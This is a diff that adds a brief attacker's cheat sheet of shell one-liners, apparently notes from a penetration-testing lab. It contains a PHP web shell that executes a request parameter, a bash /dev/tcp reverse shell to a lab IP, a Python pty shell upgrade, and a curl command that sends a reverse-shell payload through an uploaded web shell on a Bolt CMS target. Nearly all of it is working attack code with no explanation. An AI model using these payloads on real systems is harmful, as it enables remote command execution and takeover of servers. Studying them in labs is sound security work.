@@ -1,0 +1,13 @@
+python -c “import pty;pty.spawn('/bin/bash');”
+export TERM=xterm
+
+
+url code execution: <?php system($_REQUEST['GoodGuy']); ?>
+
+reverse connection on nc: bash -c ‘bash -i >& /dev/tcp/10.10.17.23/9001 0>&1’            url encond if using in burpsuite
+
+WebApp Shell:
+
+<?php system($_REQUEST['GoodGuy']); ?>
+
+curl -k 'https://10.10.10.159/bolt/files/goodguy.php' --data-urlencode "GoodGuy=bash -c 'bash -i >& /dev/tcp/127.0.0.1/9002 0>&1'"
